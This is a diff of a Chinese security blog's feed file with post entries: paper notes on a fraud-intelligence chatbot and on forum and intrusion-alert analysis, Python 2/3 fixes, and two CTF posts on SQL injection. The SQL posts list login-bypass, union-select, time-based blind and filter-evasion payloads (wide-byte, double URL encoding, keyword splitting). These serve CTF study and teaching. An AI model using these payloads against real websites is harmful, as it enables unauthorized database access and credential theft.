+    <content type="text"><![CDATA[本文发表于 NDSS 2020，通过使用聊天机器人在匿名即时聊天中主动收集现实世界中网络犯罪的情报。第一作者为 Peng Wang 为印第安纳大学Bloomington 分校的一名 Ph.D. 学生，其研究方向主要是安全和隐私。 背景与电子商务相关的欺诈活动（销售量膨胀，产品排名操控等）通常依赖于基于 IM(Instant Message) 的社交网络如 Telegram, QQ 等来实现。不法分子在即时群聊中宣传自己的攻击工具以及相应的服务，并通过一对一互动来提供购买链接。 这种通信行为轨迹对于了解电子商务欺诈具有无价的威胁情报，但获取情报往往需要和不法分子直接进行互动。 挑战谨慎的不法分子一般都只会在一对一互动中来分享有价值的情报，就导致了以往被动的情报收集方法（研究人员通过潜入 IM 聊天群组来被动的去收集多播信息）获取到的情报不那么的有价值。 而一对一的互动往往又需要人为的介入，并且新出现的电子商务不法行为的数量持续增长，从成本效益的角度来看，人为处理一对一对话是不可取的。 聊天机器人能够替代人为介入与不法分子进行交互，然而市面上可用的聊天机器人都不能够直接用于收集网络犯罪的威胁情报。有研究表明，为某种知识域设计的聊天机器人并不能很好的运用于其他域。我们首先需要了解针对特定犯罪的对话，才能够不被怀疑的与不法分子进行沟通。更复杂的是如何从战略上引导目标讨论各种地下活动，例如假帐户购买。 主要内容本文提出了 Aubrey, 一个能主动从电商不法分子那里收集有效威胁情报的聊天机器人。 基本思想：一些人通过地下 IM 群组寻求资源（SIM卡）以及相应的工作（刷单），他们与那些不法分子（卖资源，工作提供者）的聊天模式通常是问题驱动的。即，他们问一个问题，并期望能够获得相应的资源或工作的答案，然后再进行下一个回合。这样的对话模式就使得我们可以通过有限状态机来对与给定不法分子的交互进行建模，从而实现自主对话。此类FSM由对话管理器运行，以引导与相关不法行为者的对话，从而主动收集威胁情报。 AubreyAubrey的结构如图2所示，Target Finder用于识别地下IM聊天群组中的不法分子以及其的角色。Strategy Genrator构建有限状态机（FSM）以及检索模型的对话资源。Dialog Manager通过运行FSM以及检索模型来指导与指定不法分子的交互，并输出对话以及威胁情报。Fig2 Target Finder：识别地下聊天群组中不法分子的角色 首先运行两个二分类器来判断一个给定对象是upstream actor (SIM farmer,account merchant)还是downstream actor（fraud order operator)。如图1所示，upstream通常是用于提供一些攻击资产（如虚假账号等），downstream提供非法网络（如刷单平台等）。 由于SIM farmer和account merchant的群组消息具有相似的关键词，所以当给定对象的角色被判定为upstream actor的时候，还需要进一步利用情报来判定他们是SIM farmer还是account merchant。Fig1 Strategy Generation：构建有限状态机以及用于检索模型的知识源 识别对话中可以有哪些状态以及状态之间的关系。图3为三种不同角色的状态机示意图，其中圆圈代表了状态，连线代表状态之间的关系。 首先是要通过基于语义相似性的聚类算法将完整的对话分为多个对话块。对话块是对话中一段关于同一主题的连续消息。 然后，使用与给定角色相关的关键词来识别每个对话块的主题。 主题，从对话中提取出的问题及其扩展构成了一个FSM状态。 知识源扩展。当给定角色开始提问题时，系统就会开始从知识源中检索相应的响应，然而当下并没有现成的标注数据用于这个目的。所以本文作者从采集到的数据集中自动寻找与给定角色相关对话中的问题-解答对，并建立了建立状态与对话对之间的关系来让Aubrey更好地提问（即扩展FSM状态）。 首先使用（1）中的方法将对话分成对话块。 然后独立地在每个对话块中寻找问题，并将紧跟其后的消息作为回答，以此构成一个（问题，回答）对。 去掉停用句以及一些问题形式的回答。 利用jieba从对话块中提取关键字列表，并使用Word2Vec来扩展这个关键字列表。 寻找包含这些关键字的对话对，并比较这些对话对中的问题与某个FSM状态中的问题的语义相似性，相似性大于0.9就可以把这个问题加入到这个状态。 Fig3 Dialog Manager：指导状态间的过渡并利用检索模型处理问题 Dialog Manager首先会从当前状态中随机选择一个问题向不法分子提问。 不法分子回答了问题之后，Dialog Manager就如图4所示对其的回答进行分析并调用相应的函数来转换系统的状态。 回答分析：确定不法分子的回答是否定（”No fraud account available”），疑问（”How many accounts do you want?”），是否带有目标情报（”This is my store link”），还是什么都没有。 否定是通过LTP库分析句子的语法结构检查其有无否定词来判断。 疑问是通过基于规则的检测技术来进行判断。例如：疑问词（5W1H + ?）。 是否携带威胁情报是首先通过检查回答中是否有相应的实体（通过URL正则匹配和关键主题词匹配），再比较回答是否与状态中对话回答语句有语义上的相似来确认。 情报以对的形式呈现（entity, type），是状态转换的根本依据。例如：(shop.91kami.com, store link) or (“new account”, account type)。Fig4 状态转换。表1展示了每个状态相应的转换表。状态转换可以用一个元组表示：（当前状态，条件，下一个状态）。 如果某个回答是否定的，那么状态转换就可以表示为（(Start state), R is negative, (Cross-role state)）。 如果回答是一个问题，那么Aubrey就会在检索模型找到一个最相关的答复。状态转换就可以表述为(S, R is interrogative, (Retrieval model state))。检索模型比较问题与收集的对话对中的问题，找到最相似的那个问题，并返回该问题的答案。 如果回答中带有情报，那就可以跳过与该情报相关的状态，直接跳到收集下一个情报的相关状态。如图3(a)所示如果回答中包含了 SIM gateway 的情报，那么 Gateway 状态会直接被跳过，并来到 SimSource 状态。 如果回答里啥也没有，Dialog Manager就会保持当前的状态，并随机挑选另一个问题问卖家。如果两次尝试无果，就会切换到 Cross-role 状态。。Table1模型评估 数据集Table2 本文使用了如表2所示的三种数据库，分别包含了IM群组的聊天日志，对话种子以及地下论坛帖子。 Seed dialog dataset：种子数据集包含来自某公司安全分析师在与不同电子商务不法分子对话中的20个会话跟踪样本，平均长度为40条消息。 IM group chat logs：该数据集中采集的数据来自QQ，本文作者搜索了某公司提供的50个与电子商务欺诈相关的种子关键词，并加入到搜索结果中前50名最活跃的小组。对于每个人小组，作者跟踪了07/2017-10/2018这16个月的聊天记录。共计100万个小组聊天记录，生成了50K个对话对。这些对话不仅与欺诈活动有关还与正常话题有关。 Undergrand forum threads：会话线程来自两个主流的地下电商论坛htys123.com以及zuanke8.com。其中25K个会话线程，250K个对话对来自htys123.com，110K个会话线程，450K个对话来自zuanke8.com 评估结果采用 ground truth 数据集，其中包含 500个 upstream 提供商，180 个 downstream 提供商以及3000个不相关人员。最终 upstream 分类器实现了 87.0%的精度，91.2%的召回率， downstream 分类器实现了81.1%的精度，95.6%的召回率。在第二步分类中，以 SIM farmer 为正样本，最终的精度为89.0%，召回率为92.8%。 此外，本文在20,265个IM组成员的聊天记录上运行了Target Finder。 它报告了1,044位SIM farmer，700位帐号卖家和2,648个欺诈订单操作员。 图5显示了两个月新出现的活跃角色的数量，平均每月290个。 此外，Aubrey观察到的活跃角色总数在16个月内从707增加到2,064以及6月和11月由购物节带来的活跃角色数量的激增。 Fig5 总结本文提出了一个用于主动收集威胁情报的聊天机器人 Aubrey，其使用了问题驱动的对话模式来对对话交互过程进行建模。结果显示了 Aubrey 能够有效的收集电子商务中的威胁情报，并曝光未知的欺诈相关的信息。 该文为将情报收集从被动化为主动开了一个很好的头，收集了更多高价值的高隐蔽性的情报。其中的产出如SIM卡相关信息等可以用做欺诈未知账号检测的重要特征。同时，也为电子商务公司防御这类欺诈行为提供了新思路。另外，该研究分析了整个欺诈生态系统中的链条，其中账号交易是处在最核心的地位，所以我们可以通过在账号注册过程中使用多重认证甚至是人机识别来提高注册的门槛，以减少电子商务欺诈行为。在文中，Aubrey仅仅用于在中国的电子商务平台中收集欺诈相关的情报，但我们只需要基于给定的目标，重新训练Aubrey中相应的模块就可以使其对其他国家相应的欺诈活动进行情报收集，甚至是与其他网络犯罪活动（经济诈骗，恶意软件倒卖等）中的不法分子进行交流。 但问题也随之到来。Aubrey在设计中并没有考虑不法分子的警惕性，尤其是在知道了 Aubrey 的存在之后，他们可能会问一些与相关交易无关的话题来测试对话者是否是个机器人，所以之后需要更多的实验来增加 Aubrey 的健壮性，比如对一些其他领域的问题也需要能够应答。同时，在网络犯罪中，不法分子通常会使用到一些行话来规避检测，本文提出的 Aubrey 暂时还没有考虑到这个问题，后续可以在其中增加一个行话识别的模块来解决这个问题。 亮点Single-pass算法的使用原本single-pass算法可以用于对于文本的聚类，在本文中用在提取问答对。因为在一个thread中，问答不一定是依照顺序的。可能第一条是问题，第四条才是这个问题的答案，这个时候如果我们使用single-pass算法，前面的第二、三条与第一条都不大相关，它们会分为三个类。当迭代到第四条消息时，它会归到第一个类中，去形成一个问题对。 然后在看本文代码的时候发现，第二、三条都被当做了无关词和第一条放在了同一个类，在组成消息对时，就直接使用了第二条。建议可以在形成一个问答对之前，先检查问和其他所有回答的距离之后再来形成问答对，结果会更准确些。]]></content>
       <categories>
-          
-          <category> Paper </category>
-          
+        <category>Paper</category>
       </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>论文笔记 A thread embedding approach for identifying and classifying user-specified information in security forums</title>
-      <link href="/2020/01/16/REST/"/>
-      <url>/2020/01/16/REST/</url>
-      
-        <content type="html"><![CDATA[<ul><li><p>Challenges:</p><ul><li>难以有效地指定topic of interest</li><li>非结构化与非正式的数据</li></ul></li><li><p>REST:</p><ul><li>识别threads of interest基于词集（或许不完整）</li><li>将这些threads of interest进行分类</li></ul></li></ul><p>Key novelty:multi-step weighted embedding approach: we project words, threads and classes in appropriate embedding spaces and establish relevance and similarity there.</p><ul><li><p>目的：让用户宽松的指定其感兴趣的关键词</p></li><li><p>论坛数据的缺陷：</p><ul><li>噪声 “noise” </li><li>没结构 lack of structure</li><li>缺乏正式书写的文本 an abundance of informal and hastily written text</li></ul></li><li><p>REST实现两个步骤</p><ul><li>Identification：基于相似度的方法来提取相关的threads</li><li>Classification：基于权重嵌入的方法将threads分为不同的类</li></ul></li><li><p>数据集来源</p><ul><li>OffensiveCommunity</li><li>HackThisSite</li><li>EthicalHackers</li></ul></li><li><p>Threads分4类</p><ul><li>Alerts</li><li>Services</li><li>Hacks</li><li>Experiences</li></ul></li><li><p>Two Observations:</p><ul><li>most of them have one post anyway</li><li>the title and the post typically define their essence</li></ul></li></ul>]]></content>
-      
-      
+  </entry>
+  <entry>
+    <title><![CDATA[论文笔记 A thread embedding approach for identifying and classifying user-specified information in security forums]]></title>
+    <url>%2F2020%2F01%2F16%2FREST%2F</url>
+    <content type="text"><![CDATA[Challenges: 难以有效地指定topic of interest 非结构化与非正式的数据 REST: 识别threads of interest基于词集（或许不完整） 将这些threads of interest进行分类 Key novelty:multi-step weighted embedding approach: we project words, threads and classes in appropriate embedding spaces and establish relevance and similarity there. 目的：让用户宽松的指定其感兴趣的关键词 论坛数据的缺陷： 噪声 “noise” 没结构 lack of structure 缺乏正式书写的文本 an abundance of informal and hastily written text REST实现两个步骤 Identification：基于相似度的方法来提取相关的threads Classification：基于权重嵌入的方法将threads分为不同的类 数据集来源 OffensiveCommunity HackThisSite EthicalHackers Threads分4类 Alerts Services Hacks Experiences Two Observations: most of them have one post anyway the title and the post typically define their essence]]></content>
       <categories>
-          
-          <category> Paper </category>
-          
+        <category>Paper</category>
       </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>论文笔记:Extracting and Evaluating Similar and Unique Cyber Attack Strategies from Intrusion Alerts</title>
-      <link href="/2019/07/30/Extracting-and-Evaluating-Similar-and-UniqueCyber-Attack-Strategies-from-Intrusion-Alerts/"/>
-      <url>/2019/07/30/Extracting-and-Evaluating-Similar-and-UniqueCyber-Attack-Strategies-from-Intrusion-Alerts/</url>
-      
-        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>由于大量的警报与通用规则产生的高假阳性，安全分析员很难去评估攻击何时发生，怎样发生，在哪里发生。</p><h2 id="1-主要内容"><a href="#1-主要内容" class="headerlink" title="1. 主要内容"></a>1. 主要内容</h2><p>这篇文章旨在系统地处理大量的、有噪音的入侵检测警报日志，从而发现攻击者在实现攻击目标时采取的步骤以及攻击者之间的相似和不同的地方。作者的思路是首先提取出入侵警报文本中的关键特征如: time stamp, source IP, destination IP, 攻击类型，严重性等等组成的元组来作为该文章的主要研究目标入侵警报观测量(IDS alert observables)。其次，对这些大量警报按特定的标准进行去重，使用Gaussian过滤器进行降噪，将这些警报转换为攻击序列。然后，这些攻击活动序列可用于以基于后缀的(suffix-based)概率模型的形式表征网络攻击。最后，通过比较概率模型可以识别独特和类似的攻击模式。</p><h2 id="2-设计实现"><a href="#2-设计实现" class="headerlink" title="2. 设计实现"></a>2. 设计实现</h2><p>如图1所示，该文章提出的系统架构一共分为了4个部分：数据处理(主要是去重)、降噪、攻击活动序列生成、攻击模型生成(基于后缀的概率模型)</p><p><figure class="figure"><img src="https://i.loli.net/2019/07/31/5d414fd85500b84999.png" alt="Fig.1 系统架构"><figcaption class="figure__caption">Fig.1 系统架构</figcaption></figure></p>]]></content>
-      
-      
+  </entry>
+  <entry>
+    <title><![CDATA[论文笔记:Extracting and Evaluating Similar and Unique Cyber Attack Strategies from Intrusion Alerts]]></title>
+    <url>%2F2019%2F07%2F30%2FExtracting-and-Evaluating-Similar-and-UniqueCyber-Attack-Strategies-from-Intrusion-Alerts%2F</url>
+    <content type="text"><![CDATA[背景由于大量的警报与通用规则产生的高假阳性，安全分析员很难去评估攻击何时发生，怎样发生，在哪里发生。 1. 主要内容这篇文章旨在系统地处理大量的、有噪音的入侵检测警报日志，从而发现攻击者在实现攻击目标时采取的步骤以及攻击者之间的相似和不同的地方。作者的思路是首先提取出入侵警报文本中的关键特征如: time stamp, source IP, destination IP, 攻击类型，严重性等等组成的元组来作为该文章的主要研究目标入侵警报观测量(IDS alert observables)。其次，对这些大量警报按特定的标准进行去重，使用Gaussian过滤器进行降噪，将这些警报转换为攻击序列。然后，这些攻击活动序列可用于以基于后缀的(suffix-based)概率模型的形式表征网络攻击。最后，通过比较概率模型可以识别独特和类似的攻击模式。 2. 设计实现如图1所示，该文章提出的系统架构一共分为了4个部分：数据处理(主要是去重)、降噪、攻击活动序列生成、攻击模型生成(基于后缀的概率模型) Fig.1 系统架构]]></content>
       <categories>
-          
-          <category> Paper </category>
-          
+        <category>Paper</category>
       </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>两个常见的python2与python3的兼容问题</title>
-      <link href="/2019/04/08/bug-compatibility/"/>
-      <url>/2019/04/08/bug-compatibility/</url>
-      
-        <content type="html"><![CDATA[<ol><li><p>字符编码类型</p><ul><li>python2默认使用ascii字符编码,但因为ascii只支持数百个字符,不能灵活地满足非英文字符,所以p2也同时支持unicode。但是这样也多了一些标识和转换的麻烦。</li><li>python3统一使用unicode字符,节省了开发者时间。</li></ul></li></ol><h4 id="兼容技巧"><a href="#兼容技巧" class="headerlink" title="兼容技巧"></a>兼容技巧</h4><ol><li>字符串赋值之前均使用前缀u</li><li>引入unicode_literals</li></ol><hr><ol start="2"><li><p>导入模块的路径搜索方式</p><ul><li>python2导入模块时首先会搜索到当前目录(cwd),若没有,则搜索环境变量路径.这一特性会给开发者带来许多困扰,尤其是自定义模块与系统模块重名的时侯。</li><li>python3仅会搜索环境变量路径,当你需要搜索自定义模块时,你可以在包管理模式下将项目路径加入到环境变量中,然后再使用绝对路径和相对路径的方式导入。</li></ul></li></ol><h4 id="兼容技巧-1"><a href="#兼容技巧-1" class="headerlink" title="兼容技巧"></a>兼容技巧</h4><ol><li>统一使用绝对路径进行自定义模块导入</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">path&#x3D;os.path.abspath()</span><br><span class="line">sys.path.append(path)</span><br></pre></td></tr></table></figure><ol start="2"><li>如果是使用python2，则可以直接将要导入的文件夹（包）放到当前目录下。</li></ol>]]></content>
-      
-      
+  </entry>
+  <entry>
+    <title><![CDATA[两个常见的python2与python3的兼容问题]]></title>
+    <url>%2F2019%2F04%2F08%2Fbug-compatibility%2F</url>
+    <content type="text"><![CDATA[字符编码类型 python2默认使用ascii字符编码,但因为ascii只支持数百个字符,不能灵活地满足非英文字符,所以p2也同时支持unicode。但是这样也多了一些标识和转换的麻烦。 python3统一使用unicode字符,节省了开发者时间。 兼容技巧 字符串赋值之前均使用前缀u 引入unicode_literals 导入模块的路径搜索方式 python2导入模块时首先会搜索到当前目录(cwd),若没有,则搜索环境变量路径.这一特性会给开发者带来许多困扰,尤其是自定义模块与系统模块重名的时侯。 python3仅会搜索环境变量路径,当你需要搜索自定义模块时,你可以在包管理模式下将项目路径加入到环境变量中,然后再使用绝对路径和相对路径的方式导入。 兼容技巧 统一使用绝对路径进行自定义模块导入 12345import osimport syspath&#x3D;os.path.abspath()sys.path.append(path) 如果是使用python2，则可以直接将要导入的文件夹（包）放到当前目录下。]]></content>
       <categories>
-          
-          <category> Bugs </category>
-          
+        <category>Bugs</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> python </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>flask jinja2 UnicodeDecodeError 解决方法</title>
-      <link href="/2019/04/08/bug-flask/"/>
-      <url>/2019/04/08/bug-flask/</url>
-      
-        <content type="html"><![CDATA[<p><strong>在python2中,当有中文传递给jinja2模板会报如下错误:</strong></p><blockquote><p>UnicodeDecodeError: ‘ascii’ codec can’t decode byte 0xe6 in position 0: ordinal not in range(128)</p></blockquote><p>这个时侯单单在字符串前加u表示为unicode字符已经没有用了，而是需要加上一段代码来搞定：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import sys #导入sys模块</span><br><span class="line"></span><br><span class="line">reload(sys) #在之前import进来时,setdefaultencoding函数在被系统调用后删除了,所以必须重新加载此模块</span><br><span class="line"></span><br><span class="line">sys.setdefaultencoding(&#39;utf-8&#39;) #修改默认编码方式</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[flask jinja2 UnicodeDecodeError 解决方法]]></title>
+    <url>%2F2019%2F04%2F08%2Fbug-flask%2F</url>
+    <content type="text"><![CDATA[在python2中,当有中文传递给jinja2模板会报如下错误: UnicodeDecodeError: ‘ascii’ codec can’t decode byte 0xe6 in position 0: ordinal not in range(128) 这个时侯单单在字符串前加u表示为unicode字符已经没有用了，而是需要加上一段代码来搞定： 12345import sys #导入sys模块reload(sys) #在之前import进来时,setdefaultencoding函数在被系统调用后删除了,所以必须重新加载此模块sys.setdefaultencoding(&#39;utf-8&#39;) #修改默认编码方式]]></content>
       <categories>
-          
-          <category> Bugs </category>
-          
+        <category>Bugs</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> python </tag>
-            
-            <tag> flask </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>CTF中的SQL注入的思路总结</title>
-      <link href="/2019/03/16/sql0/"/>
-      <url>/2019/03/16/sql0/</url>
-      
-        <content type="html"><![CDATA[<h4 id="1-拿到题目之后一般是一个登陆框-大概率盲注或者是报错-写脚本跑"><a href="#1-拿到题目之后一般是一个登陆框-大概率盲注或者是报错-写脚本跑" class="headerlink" title="1.拿到题目之后一般是一个登陆框(大概率盲注或者是报错,写脚本跑):"></a>1.拿到题目之后一般是一个登陆框(大概率盲注或者是报错,写脚本跑):</h4><p><figure class="figure"><img src="https://i.loli.net/2018/09/11/5b979e5c0ee9b.png" alt="1.png"><figcaption class="figure__caption">1.png</figcaption></figure></p><p>尝试输入用户名(admin)和密码(随意)查看其返回结果这里一般又分为两种:</p><ol><li>有返回是密码错误还是用户名错误</li><li>只是单一的返回登陆失败</li></ol><p><strong>对于第一种情况就可以直接尝试在<code>username</code>之后输入payload的了</strong></p><ul><li>判断注入点</li><li>按照执行效果判断sql注入类型</li><li>利用字典跑一下被过滤的特殊符号和关键字(判断语句一般使用regexp或length(),and或者异或,再或者就是直接输入)<blockquote><p>payload <code>and length(&#39;关键字&#39;)&gt;0</code></p><pre><code>`^length(&apos;关键字&apos;)&gt;0`</code></pre></blockquote></li><li>最后利用information_schema爆出库名,表名,字段名以及flag</li></ul><p><strong>对于第二种情况就稍微要复杂一些了</strong></p><ul><li>可以用burp抓个包,查看一下数据包中是否存在着一些提示内容</li><li>尝试一些万能的登陆密码:假设sql语句是:<br><code>select * from user where username=’$username’ and password=’$password’</code><br>而我们我发送的数据包中是 <code>username= &amp;password=</code>                            </li></ul><ol><li><p><code>username=reborn&#39;=&#39;&amp;password=reborn&#39;=&#39;</code> =&gt; <code>select * from user where username=&#39;reborn&#39;=&#39; and password=&#39;reborn&#39;=&#39;</code>=&gt;<code>select * from user where 1 and 1</code></p></li><li><p><code>username=&#39; or 1=1 %23&amp;password=123456</code></p></li><li><p><code>username=admicsfn&#39; union select &#39;25d55ad283aa400af464c76d713c07ad&#39;%23&amp;password=12345678</code>利用不存在的用户再去构造一个密码来进行登陆</p></li></ol><ul><li>查看一下(利用字典)试一试哪一个特殊符号会报错之类的,如果有报错,则考虑报错注入</li><li>如果报错的是一些不常见的字符串,那可能就涉及了某些漏洞,比如%报错,就可能是sprintf格式化字符串漏洞</li><li>题外话:平时多浏览一些安全网站,去找新出现的漏洞,及时去做一些漏洞复现,与时俱进</li></ul><h4 id="2-题目是GET注入-大概率是回显注入"><a href="#2-题目是GET注入-大概率是回显注入" class="headerlink" title="2.题目是GET注入(大概率是回显注入)"></a>2.题目是GET注入(大概率是回显注入)</h4><ol><li>判断注入点</li><li>利用order by判断字段数</li><li><code>union select 1,2,3,...%23</code>判断具体哪个字段存在回显</li><li>利用字典跑一下被过滤的特殊符号和关键字(判断语句一般使用length(),and或者异或,再或者就是直接输入)</li><li>最后利用information_schema爆出库名,表名,字段名以及flag</li></ol><ul><li>如果回显的内容一直不存在变化那就需要考虑盲注了</li></ul><h4 id="3-页面直接返回注入结果-insert等其他类型的注入-考虑时间盲注"><a href="#3-页面直接返回注入结果-insert等其他类型的注入-考虑时间盲注" class="headerlink" title="3.页面直接返回注入结果(insert等其他类型的注入,考虑时间盲注)"></a>3.页面直接返回注入结果(insert等其他类型的注入,考虑时间盲注)</h4><p>可以使用<code>&#39; and sleep(5)=&#39;1&#39;=&#39;1</code>或<code>&#39; and sleep(5)=&#39;1&#39;=&#39;1&#39; %23</code>来判断sleep()能否执行    </p>]]></content>
-      
-      
+      <tags>
+        <tag>python</tag>
+        <tag>flask</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CTF中的SQL注入的思路总结]]></title>
+    <url>%2F2019%2F03%2F16%2Fsql0%2F</url>
+    <content type="text"><![CDATA[1.拿到题目之后一般是一个登陆框(大概率盲注或者是报错,写脚本跑):1.png 尝试输入用户名(admin)和密码(随意)查看其返回结果这里一般又分为两种: 有返回是密码错误还是用户名错误 只是单一的返回登陆失败 对于第一种情况就可以直接尝试在username之后输入payload的了 判断注入点 按照执行效果判断sql注入类型 利用字典跑一下被过滤的特殊符号和关键字(判断语句一般使用regexp或length(),and或者异或,再或者就是直接输入) payload and length(&#39;关键字&#39;)&gt;0 `^length(&apos;关键字&apos;)&gt;0` 最后利用information_schema爆出库名,表名,字段名以及flag 对于第二种情况就稍微要复杂一些了 可以用burp抓个包,查看一下数据包中是否存在着一些提示内容 尝试一些万能的登陆密码:假设sql语句是:select * from user where username=’$username’ and password=’$password’而我们我发送的数据包中是 username= &amp;password= username=reborn&#39;=&#39;&amp;password=reborn&#39;=&#39; =&gt; select * from user where username=&#39;reborn&#39;=&#39; and password=&#39;reborn&#39;=&#39;=&gt;select * from user where 1 and 1 username=&#39; or 1=1 %23&amp;password=123456 username=admicsfn&#39; union select &#39;25d55ad283aa400af464c76d713c07ad&#39;%23&amp;password=12345678利用不存在的用户再去构造一个密码来进行登陆 查看一下(利用字典)试一试哪一个特殊符号会报错之类的,如果有报错,则考虑报错注入 如果报错的是一些不常见的字符串,那可能就涉及了某些漏洞,比如%报错,就可能是sprintf格式化字符串漏洞 题外话:平时多浏览一些安全网站,去找新出现的漏洞,及时去做一些漏洞复现,与时俱进 2.题目是GET注入(大概率是回显注入) 判断注入点 利用order by判断字段数 union select 1,2,3,...%23判断具体哪个字段存在回显 利用字典跑一下被过滤的特殊符号和关键字(判断语句一般使用length(),and或者异或,再或者就是直接输入) 最后利用information_schema爆出库名,表名,字段名以及flag 如果回显的内容一直不存在变化那就需要考虑盲注了 3.页面直接返回注入结果(insert等其他类型的注入,考虑时间盲注)可以使用&#39; and sleep(5)=&#39;1&#39;=&#39;1或&#39; and sleep(5)=&#39;1&#39;=&#39;1&#39; %23来判断sleep()能否执行]]></content>
       <categories>
-          
-          <category> Web Security </category>
-          
+        <category>Web Security</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> Sql </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SQL注入中的绕过</title>
-      <link href="/2019/03/16/sql7/"/>
-      <url>/2019/03/16/sql7/</url>
-      
-        <content type="html"><![CDATA[<p>###一.对于关键字的绕过</p><ol><li>注释符绕过:<code>uni/**/on se/**/lect</code></li><li>大小写绕过:<code>UniOn SeleCt</code></li><li>双关键字绕过:<code>ununionion seselectlect</code></li><li>&lt;&gt;绕过:<code>unio&lt;&gt;n sel&lt;&gt;ect</code>(可能是有些网站为了防止xss注入,所以过滤了&lt;&gt;,参照i春秋sql)</li><li>对于and,or的绕过其实还可以尝试一下&amp;&amp;,||,<a href="https://blog.csdn.net/zpy1998zpy/article/details/80667775" target="_blank" rel="noopener">异或注入</a></li></ol><p><strong>这里需要注意一点就是or被过滤的时候order,information中的or也被过滤了</strong></p><hr><p>###二.对特殊字符的绕过</p><ul><li><p>对空格的绕过:<br></p><pre>两个空格代替一个,用tab键代替空格`/**/ %20 %09 %0a` 利用空格绕过:很多关键字都可以写成带括号的形式select(),or()特殊函数中的空格绕过:ascii(mid(xxfrom(1))) ascii(substr(xxfrom(1)))</pre></li><li><p>对单引号的绕过:<br><br><code>宽字节 %bf%27 %df%27 %aa%27(争对字符集为GBK时使用</code><br><br><code>十六进制绕过(针对需要输入表名的时候 &#39;user&#39;=&gt;0x7573657273)</code><br></p></li><li><p>对逗号的绕过:</p>  <pre>  substr(x,1,1),mid(x,1,1)=>substr(x from 1 for 1) mid(x from 1 for 1)  limit 0,1=> limit 0 offset 1  join(本身是用来连接两个表单的,所以join一定是要放在from后面放表单的位置):  union select 1,2 =>  union select * from (select 1)a join (select 2)b  select case when (条件) then (代码1) else (代码2) end 可以对应上if(条件,代码1,代码2)  if(substring((select user()) from 1 for 1)='e',sleep(5),1)  可以变为  select case when substring((select user()) from 1 for 1)='e' then sleep(5) else 1 end   </pre></li><li><p>等号的绕过:</p><pre>  利用<>(即不等于号)绕过  利用like绕过  利用greatest()绕过(greatest(a,b)返回较大的那个数)  ?id=' or 1 like 1  ?id=' or 1 <> 1  ?id=' union select greatest(substr((select user()),1,1),95)</pre></li></ul><hr><p>###三.其他类型的绕过</p><ul><li><p>编码绕过:</p><pre>  * 双重url编码:?id=1%252f%252aUNION%252f%252aSELECT%252f%252a1,2,password%252f%252aFROM%252f%252a/Users--+  * unicode编码:'=> %u0037 %u02b9                空格=> %u0020 %uff00                左括号=> %u0028 %uff08                  右括号=> %u0029 %uff09</pre>    </li><li><p>相同字符的绕过:<br><br>题目中有是可能会出现一种情况:</p><blockquote><p>它不允许出现某个字符串,但是在数据库中又确实存在这个字符串,再加之mysql与php的编码字符集不相同,便可以利用相似的字符将其绕过</p></blockquote></li></ul><p><figure class="figure"><img src="https://i.loli.net/2018/09/13/5b9a54128b0b7.png" alt="1.png"><figcaption class="figure__caption">1.png</figcaption></figure></p><p>可以参考的题目<a href="https://www.ichunqiu.com/battalion" target="_blank" rel="noopener">百度杯十月场look</a></p>]]></content>
-      
-      
+      <tags>
+        <tag>Sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SQL注入中的绕过]]></title>
+    <url>%2F2019%2F03%2F16%2Fsql7%2F</url>
+    <content type="text"><![CDATA[###一.对于关键字的绕过 注释符绕过:uni/**/on se/**/lect 大小写绕过:UniOn SeleCt 双关键字绕过:ununionion seselectlect &lt;&gt;绕过:unio&lt;&gt;n sel&lt;&gt;ect(可能是有些网站为了防止xss注入,所以过滤了&lt;&gt;,参照i春秋sql) 对于and,or的绕过其实还可以尝试一下&amp;&amp;,||,异或注入 这里需要注意一点就是or被过滤的时候order,information中的or也被过滤了 ###二.对特殊字符的绕过 对空格的绕过: 两个空格代替一个,用tab键代替空格 `/**/ %20 %09 %0a` 利用空格绕过:很多关键字都可以写成带括号的形式select(),or() 特殊函数中的空格绕过:ascii(mid(xxfrom(1))) ascii(substr(xxfrom(1))) 对单引号的绕过:宽字节 %bf%27 %df%27 %aa%27(争对字符集为GBK时使用十六进制绕过(针对需要输入表名的时候 &#39;user&#39;=&gt;0x7573657273) 对逗号的绕过: substr(x,1,1),mid(x,1,1)=>substr(x from 1 for 1) mid(x from 1 for 1) limit 0,1=> limit 0 offset 1 join(本身是用来连接两个表单的,所以join一定是要放在from后面放表单的位置): union select 1,2 => union select * from (select 1)a join (select 2)b select case when (条件) then (代码1) else (代码2) end 可以对应上if(条件,代码1,代码2) if(substring((select user()) from 1 for 1)='e',sleep(5),1) 可以变为 select case when substring((select user()) from 1 for 1)='e' then sleep(5) else 1 end 等号的绕过: 利用(即不等于号)绕过 利用like绕过 利用greatest()绕过(greatest(a,b)返回较大的那个数) ?id=' or 1 like 1 ?id=' or 1 1 ?id=' union select greatest(substr((select user()),1,1),95) ###三.其他类型的绕过 编码绕过: * 双重url编码:?id=1%252f%252aUNION%252f%252aSELECT%252f%252a1,2,password%252f%252aFROM%252f%252a/Users--+ * unicode编码:'=> %u0037 %u02b9 空格=> %u0020 %uff00 左括号=> %u0028 %uff08 右括号=> %u0029 %uff09 